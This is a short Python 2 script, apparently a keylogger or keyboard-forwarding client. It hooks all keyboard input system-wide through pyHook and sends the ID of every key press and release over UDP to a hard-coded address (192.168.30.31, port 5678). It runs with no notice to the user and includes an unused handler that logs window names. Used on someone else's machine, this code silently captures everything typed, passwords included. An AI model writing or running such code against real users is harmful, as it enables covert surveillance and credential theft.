__author__ = 'Cyber-01'
import pyHook,pythoncom
import socket
IP = "192.168.30.31"
KEYBOARD_PORT = 5678

def OnKeyboardEvent(event):
    print 'MessageName:',event.MessageName
    print 'Message:',event.Message
    print 'Time:',event.Time
    print 'Window:',event.Window
    print 'WindowName:',event.WindowName
    print 'Ascii:', event.Ascii, chr(event.Ascii)
    print 'Key:', event.Key
    print 'KeyID:', event.KeyID
    print 'ScanCode:', event.ScanCode
    print 'Extended:', event.Extended
    print 'Injected:', event.Injected
    print 'Alt', event.Alt
    print 'Transition', event.Transition
   #789/*- print "Key Hex" ,event.Key ,hex(event.Key)
    hex_key = event.KeyID
    print '---'


# return True to pass the event to other handlers
    return True


def KeyPress(event,keyboard_socket):

    key_id = event.KeyID
    keyboard_socket.sendto("*"+hex(key_id), (IP, KEYBOARD_PORT))
    return True

def KeyRelease(event,keyboard_socket):

    key_id = event.KeyID
    keyboard_socket.sendto("^"+hex(key_id), (IP, KEYBOARD_PORT))
    return True

def main():


    keyboard_socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)  # Creating a udp client that sends keyboard activity

    # create a hook manager
    hm = pyHook.HookManager()

    #hm.KeyDown = OnKeyboardEvent
    hm.KeyDown = lambda event: KeyPress(event,keyboard_socket)
    hm.KeyUp = lambda event: KeyRelease(event,keyboard_socket)
  #  hm.KeyDown = lambda kdn_press: key_press_down(kdn_press, keyboard_sock, procees_list)
    # set the hook
    hm.HookKeyboard()
    # wait forever
    pythoncom.PumpMessages()

if __name__ == '__main__':
    main()